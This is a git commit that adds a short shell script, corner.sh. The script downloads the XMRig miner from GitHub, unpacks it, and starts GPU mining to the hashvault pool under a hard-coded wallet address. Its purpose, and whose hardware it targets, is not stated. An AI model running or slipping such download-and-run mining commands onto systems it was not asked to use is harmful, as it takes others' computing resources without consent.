3266bdfa300922edaf6dd0d7b11c9a6fe909757a
goodishere1 <122890664+goodishere1@users.noreply.github.com>
2023-01-17 14:59:39 +0100

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,7 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+
+tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+
+cd xmrig-6.12.2
+
+./xmrig --no-cpu --cuda --url pool.hashvault.pro:80 --user 43zV9bgKveT8QrK6hWzbXKRNQxKT1wCiM5ggmYc8pfMY6WnBCYtyMGjj2NeRKJXYgnFpmLotjsL2vF2idghnVboiMMTMpEd --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
